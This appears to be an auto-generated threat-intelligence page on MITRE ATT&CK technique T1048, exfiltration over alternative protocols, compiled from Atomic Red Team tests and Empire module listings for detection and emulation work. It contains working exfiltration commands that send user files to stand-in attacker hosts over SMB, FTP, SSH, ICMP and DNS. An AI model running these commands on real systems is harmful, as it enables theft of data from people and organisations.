
# Exfiltration Over Alternative Protocol

## Description

### MITRE Description

> Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different channels could include Internet Web services such as cloud storage.

Adversaries may leverage various operating system utilities to exfiltrate data over an alternative protocol. 

SMB command-line example:

* <code>net use \\\attacker_system\IPC$ /user:username password && xcopy /S /H /C /Y C:\Users\\* \\\attacker_system\share_folder\</code>

Anonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)

* <code>echo PUT C:\Path\to\file.txt | ftp -A attacker_system</code>


## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1048

## Potential Commands

```
ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz

tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'

tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'

tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'

$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }

$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }

powershell/exfiltration/exfil_dropbox
powershell/exfiltration/exfil_dropbox
exfiltration/Invoke_ExfilDataToGitHub
exfiltration/Invoke_ExfilDataToGitHub
```

## Commands Dataset

```
[{'command': 'ssh target.example.com "(cd /etc && tar -zcvf - *)" > '
             './etc.tar.gz\n',
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh '
             "#{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n",
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh '
             "atomic@#{domain} 'cat > /Users.tar.gz.enc'\n",
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh '
             "#{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n",
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': '$ping = New-Object System.Net.Networkinformation.ping; '
             'foreach($Data in Get-Content -Path '
             'C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount '
             '1024) { $ping.Send("#{ip_address}", 1500, $Data) }\n',
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': '$ping = New-Object System.Net.Networkinformation.ping; '
             'foreach($Data in Get-Content -Path #{input_file} -Encoding Byte '
             '-ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }\n',
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'powershell/exfiltration/exfil_dropbox',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/exfiltration/exfil_dropbox',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'exfiltration/Invoke_ExfilDataToGitHub',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'exfiltration/Invoke_ExfilDataToGitHub',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['User interface']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['User interface']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Exfiltration Over Alternative Protocol': {'atomic_tests': [{'auto_generated_guid': 'f6786cc8-beda-4915-a4d6-ac2f193bb988',
                                                                                      'description': 'Input '
                                                                                                     'a '
                                                                                                     'domain '
                                                                                                     'and '
                                                                                                     'test '
                                                                                                     'Exfiltration '
                                                                                                     'over '
                                                                                                     'SSH\n'
                                                                                                     '\n'
                                                                                                     'Remote '
                                                                                                     'to '
                                                                                                     'Local\n'
                                                                                                     '\n'
                                                                                                     'Upon '
                                                                                                     'successful '
                                                                                                     'execution, '
                                                                                                     'sh '
                                                                                                     'will '
                                                                                                     'spawn '
                                                                                                     'ssh '
                                                                                                     'contacting '
                                                                                                     'a '
                                                                                                     'remote '
                                                                                                     'domain '
                                                                                                     '(default: '
                                                                                                     'target.example.com) '
                                                                                                     'writing '
                                                                                                     'a '
                                                                                                     'tar.gz '
                                                                                                     'file.\n',
                                                                                      'executor': {'command': 'ssh '
                                                                                                              '#{domain} '
                                                                                                              '"(cd '
                                                                                                              '/etc '
                                                                                                              '&& '
                                                                                                              'tar '
                                                                                                              '-zcvf '
                                                                                                              '- '
                                                                                                              '*)" '
                                                                                                              '> '
                                                                                                              './etc.tar.gz\n',
                                                                                                   'elevation_required': False,
                                                                                                   'name': 'sh'},
                                                                                      'input_arguments': {'domain': {'default': 'target.example.com',
                                                                                                                     'description': 'target '
                                                                                                                                    'SSH '
                                                                                                                                    'domain',
                                                                                                                     'type': 'url'}},
                                                                                      'name': 'Exfiltration '
                                                                                              'Over '
                                                                                              'Alternative '
                                                                                              'Protocol '
                                                                                              '- '
                                                                                              'SSH',
                                                                                      'supported_platforms': ['macos',
                                                                                                              'linux']},
                                                                                     {'auto_generated_guid': '7c3cb337-35ae-4d06-bf03-3032ed2ec268',
                                                                                      'description': 'Input '
                                                                                                     'a '
                                                                                                     'domain '
                                                                                                     'and '
                                                                                                     'test '
                                                                                                     'Exfiltration '
                                                                                                     'over '
                                                                                                     'SSH\n'
                                                                                                     '\n'
                                                                                                     'Local '
                                                                                                     'to '
                                                                                                     'Remote\n'
                                                                                                     '\n'
                                                                                                     'Upon '
                                                                                                     'successful '
                                                                                                     'execution, '
                                                                                                     'tar '
                                                                                                     'will '
                                                                                                     'compress '
                                                                                                     '/Users/* '
                                                                                                     'directory '
                                                                                                     'and '
                                                                                                     'password '
                                                                                                     'protect '
                                                                                                     'the '
                                                                                                     'file '
                                                                                                     'modification '
                                                                                                     'of '
                                                                                                     '`Users.tar.gz.enc` '
                                                                                                     'as '
                                                                                                     'output.\n',
                                                                                      'executor': {'command': 'tar '
                                                                                                              'czpf '
                                                                                                              '- '
                                                                                                              '/Users/* '
                                                                                                              '| '
                                                                                                              'openssl '
                                                                                                              'des3 '
                                                                                                              '-salt '
                                                                                                              '-pass '
                                                                                                              '#{password} '
                                                                                                              '| '
                                                                                                              'ssh '
                                                                                                              '#{user_name}@#{domain} '
                                                                                                              "'cat "
                                                                                                              '> '
                                                                                                              "/Users.tar.gz.enc'\n",
                                                                                                   'elevation_required': False,
                                                                                                   'name': 'sh'},
                                                                                      'input_arguments': {'domain': {'default': 'target.example.com',
                                                                                                                     'description': 'target '
                                                                                                                                    'SSH '
                                                                                                                                    'domain',
                                                                                                                     'type': 'url'},
                                                                                                          'password': {'default': 'atomic',
                                                                                                                       'description': 'password '
                                                                                                                                      'for '
                                                                                                                                      'user',
                                                                                                                       'type': 'string'},
                                                                                                          'user_name': {'default': 'atomic',
                                                                                                                        'description': 'username '
                                                                                                                                       'for '
                                                                                                                                       'domain',
                                                                                                                        'type': 'string'}},
                                                                                      'name': 'Exfiltration '
                                                                                              'Over '
                                                                                              'Alternative '
                                                                                              'Protocol '
                                                                                              '- '
                                                                                              'SSH',
                                                                                      'supported_platforms': ['macos',
                                                                                                              'linux']},
                                                                                     {'auto_generated_guid': '1d1abbd6-a3d3-4b2e-bef5-c59293f46eff',
                                                                                      'description': 'A '
                                                                                                     'firewall '
                                                                                                     'rule '
                                                                                                     '(iptables '
                                                                                                     'or '
                                                                                                     'firewalld) '
                                                                                                     'will '
                                                                                                     'be '
                                                                                                     'needed '
                                                                                                     'to '
                                                                                                     'allow '
                                                                                                     'exfiltration '
                                                                                                     'on '
                                                                                                     'port '
                                                                                                     '1337.\n'
                                                                                                     '\n'
                                                                                                     'Upon '
                                                                                                     'successful '
                                                                                                     'execution, '
                                                                                                     'sh '
                                                                                                     'will '
                                                                                                     'be '
                                                                                                     'used '
                                                                                                     'to '
                                                                                                     'make '
                                                                                                     'a '
                                                                                                     'directory '
                                                                                                     '(/tmp/victim-staging-area), '
                                                                                                     'write '
                                                                                                     'a '
                                                                                                     'txt '
                                                                                                     'file, '
                                                                                                     'and '
                                                                                                     'host '
                                                                                                     'the '
                                                                                                     'directory '
                                                                                                     'with '
                                                                                                     'Python '
                                                                                                     'on '
                                                                                                     'port '
                                                                                                     '1337, '
                                                                                                     'to '
                                                                                                     'be '
                                                                                                     'later '
                                                                                                     'downloaded.\n',
                                                                                      'executor': {'name': 'manual',
                                                                                                   'steps': '1. '
                                                                                                            'Victim '
                                                                                                            'System '
                                                                                                            'Configuration:\n'
                                                                                                            '\n'
                                                                                                            '    '
                                                                                                            'mkdir '
                                                                                                            '/tmp/victim-staging-area\n'
                                                                                                            '    '
                                                                                                            'echo '
                                                                                                            '"this '
                                                                                                            'file '
                                                                                                            'will '
                                                                                                            'be '
                                                                                                            'exfiltrated" '
                                                                                                            '> '
                                                                                                            '/tmp/victim-staging-area/victim-file.txt\n'
                                                                                                            '\n'
                                                                                                            '2. '
                                                                                                            'Using '
                                                                                                            'Python '
                                                                                                            'to '
                                                                                                            'establish '
                                                                                                            'a '
                                                                                                            'one-line '
                                                                                                            'HTTP '
                                                                                                            'server '
                                                                                                            'on '
                                                                                                            'victim '
                                                                                                            'system:\n'
                                                                                                            '\n'
                                                                                                            '    '
                                                                                                            'cd '
                                                                                                            '/tmp/victim-staging-area\n'
                                                                                                            '    '
                                                                                                            'python '
                                                                                                            '-m '
                                                                                                            'SimpleHTTPServer '
                                                                                                            '1337\n'
                                                                                                            '\n'
                                                                                                            '3. '
                                                                                                            'To '
                                                                                                            'retrieve '
                                                                                                            'the '
                                                                                                            'data '
                                                                                                            'from '
                                                                                                            'an '
                                                                                                            'adversary '
                                                                                                            'system:\n'
                                                                                                            '\n'
                                                                                                            '    '
                                                                                                            'wget '
                                                                                                            'http://VICTIM_IP:1337/victim-file.txt\n'},
                                                                                      'name': 'Exfiltration '
                                                                                              'Over '
                                                                                              'Alternative '
                                                                                              'Protocol '
                                                                                              '- '
                                                                                              'HTTP',
                                                                                      'supported_platforms': ['macos',
                                                                                                              'linux']},
                                                                                     {'auto_generated_guid': 'dd4b4421-2e25-4593-90ae-7021947ad12e',
                                                                                      'description': 'Exfiltration '
                                                                                                     'of '
                                                                                                     'specified '
                                                                                                     'file '
                                                                                                     'over '
                                                                                                     'ICMP '
                                                                                                     'protocol.\n'
                                                                                                     '\n'
                                                                                                     'Upon '
                                                                                                     'successful '
                                                                                                     'execution, '
                                                                                                     'powershell '
                                                                                                     'will '
                                                                                                     'utilize '
                                                                                                     'ping '
                                                                                                     '(icmp) '
                                                                                                     'to '
                                                                                                     'exfiltrate '
                                                                                                     'notepad.exe '
                                                                                                     'to '
                                                                                                     'a '
                                                                                                     'remote '
                                                                                                     'address '
                                                                                                     '(default '
                                                                                                     '127.0.0.1). '
                                                                                                     'Results '
                                                                                                     'will '
                                                                                                     'be '
                                                                                                     'via '
                                                                                                     'stdout.\n',
                                                                                      'executor': {'command': '$ping '
                                                                                                              '= '
                                                                                                              'New-Object '
                                                                                                              'System.Net.Networkinformation.ping; '
                                                                                                              'foreach($Data '
                                                                                                              'in '
                                                                                                              'Get-Content '
                                                                                                              '-Path '
                                                                                                              '#{input_file} '
                                                                                                              '-Encoding '
                                                                                                              'Byte '
                                                                                                              '-ReadCount '
                                                                                                              '1024) '
                                                                                                              '{ '
                                                                                                              '$ping.Send("#{ip_address}", '
                                                                                                              '1500, '
                                                                                                              '$Data) '
                                                                                                              '}\n',
                                                                                                   'elevation_required': False,
                                                                                                   'name': 'powershell'},
                                                                                      'input_arguments': {'input_file': {'default': 'C:\\Windows\\System32\\notepad.exe',
                                                                                                                         'description': 'Path '
                                                                                                                                        'to '
                                                                                                                                        'file '
                                                                                                                                        'to '
                                                                                                                                        'be '
                                                                                                                                        'exfiltrated.',
                                                                                                                         'type': 'Path'},
                                                                                                          'ip_address': {'default': '127.0.0.1',
                                                                                                                         'description': 'Destination '
                                                                                                                                        'IP '
                                                                                                                                        'address '
                                                                                                                                        'where '
                                                                                                                                        'the '
                                                                                                                                        'data '
                                                                                                                                        'should '
                                                                                                                                        'be '
                                                                                                                                        'sent.',
                                                                                                                         'type': 'String'}},
                                                                                      'name': 'Exfiltration '
                                                                                              'Over '
                                                                                              'Alternative '
                                                                                              'Protocol '
                                                                                              '- '
                                                                                              'ICMP',
                                                                                      'supported_platforms': ['windows']},
                                                                                     {'auto_generated_guid': 'c403b5a4-b5fc-49f2-b181-d1c80d27db45',
                                                                                      'description': 'Exfiltration '
                                                                                                     'of '
                                                                                                     'specified '
                                                                                                     'file '
                                                                                                     'over '
                                                                                                     'DNS '
                                                                                                     'protocol.\n',
                                                                                      'executor': {'name': 'manual',
                                                                                                   'steps': '1. '
                                                                                                            'On '
                                                                                                            'the '
                                                                                                            'adversary '
                                                                                                            'machine '
                                                                                                            'run '
                                                                                                            'the '
                                                                                                            'below '
                                                                                                            'command.\n'
                                                                                                            '\n'
                                                                                                            '    '
                                                                                                            'tshark '
                                                                                                            '-f '
                                                                                                            '"udp '
                                                                                                            'port '
                                                                                                            '53" '
                                                                                                            '-Y '
                                                                                                            '"dns.qry.type '
                                                                                                            '== '
                                                                                                            '1 '
                                                                                                            'and '
                                                                                                            'dns.flags.response '
                                                                                                            '== '
                                                                                                            '0 '
                                                                                                            'and '
                                                                                                            'dns.qry.name '
                                                                                                            'matches '
                                                                                                            '".domain"" '
                                                                                                            '>> '
                                                                                                            'received_data.txt\n'
                                                                                                            '\n'
                                                                                                            '2. '
                                                                                                            'On '
                                                                                                            'the '
                                                                                                            'victim '
                                                                                                            'machine '
                                                                                                            'run '
                                                                                                            'the '
                                                                                                            'below '
                                                                                                            'commands.\n'
                                                                                                            '\n'
                                                                                                            '    '
                                                                                                            'xxd '
                                                                                                            '-p '
                                                                                                            'input_file '
                                                                                                            '> '
                                                                                                            'encoded_data.hex '
                                                                                                            '| '
                                                                                                            'for '
                                                                                                            'data '
                                                                                                            'in '
                                                                                                            '`cat '
                                                                                                            'encoded_data.hex`; '
                                                                                                            'do '
                                                                                                            'dig '
                                                                                                            '$data.domain; '
                                                                                                            'done\n'
                                                                                                            '    \n'
                                                                                                            '3. '
                                                                                                            'Once '
                                                                                                            'the '
                                                                                                            'data '
                                                                                                            'is '
                                                                                                            'received, '
                                                                                                            'use '
                                                                                                            'the '
                                                                                                            'below '
                                                                                                            'command '
                                                                                                            'to '
                                                                                                            'recover '
                                                                                                            'the '
                                                                                                            'data.\n'
                                                                                                            '\n'
                                                                                                            '    '
                                                                                                            'cat '
                                                                                                            'output_file '
                                                                                                            '| '
                                                                                                            'cut '
                                                                                                            '-d '
                                                                                                            '"A" '
                                                                                                            '-f '
                                                                                                            '2 '
                                                                                                            '| '
                                                                                                            'cut '
                                                                                                            '-d '
                                                                                                            '" '
                                                                                                            '" '
                                                                                                            '-f '
                                                                                                            '2 '
                                                                                                            '| '
                                                                                                            'cut '
                                                                                                            '-d '
                                                                                                            '"." '
                                                                                                            '-f '
                                                                                                            '1 '
                                                                                                            '| '
                                                                                                            'sort '
                                                                                                            '| '
                                                                                                            'uniq '
                                                                                                            '| '
                                                                                                            'xxd '
                                                                                                            '-p '
                                                                                                            '-r\n'},
                                                                                      'name': 'Exfiltration '
                                                                                              'Over '
                                                                                              'Alternative '
                                                                                              'Protocol '
                                                                                              '- '
                                                                                              'DNS',
                                                                                      'supported_platforms': ['linux']}],
                                                                    'attack_technique': 'T1048',
                                                                    'display_name': 'Exfiltration '
                                                                                    'Over '
                                                                                    'Alternative '
                                                                                    'Protocol'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1048',
                                            'ATT&CK Technique #2': 'T1071',
                                            'Concatenate for Python Dictionary': '"powershell/exfiltration/exfil_dropbox":  '
                                                                                 '["T1048","T1071"],',
                                            'Empire Module': 'powershell/exfiltration/exfil_dropbox',
                                            'Technique': 'Exfiltration Over '
                                                         'Alternative '
                                                         'Protocol'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1048',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"exfiltration/Invoke_ExfilDataToGitHub":  '
                                                                                 '["T1048"],',
                                            'Empire Module': 'exfiltration/Invoke_ExfilDataToGitHub',
                                            'Technique': 'Exfiltration Over '
                                                         'Alternative '
                                                         'Protocol'}}]
```

# Tactics


* [Exfiltration](../tactics/Exfiltration.md)


# Mitigations

None

# Actors


* [OilRig](../actors/OilRig.md)

* [FIN8](../actors/FIN8.md)
    
* [Thrip](../actors/Thrip.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT33](../actors/APT33.md)
    
* [Turla](../actors/Turla.md)
    
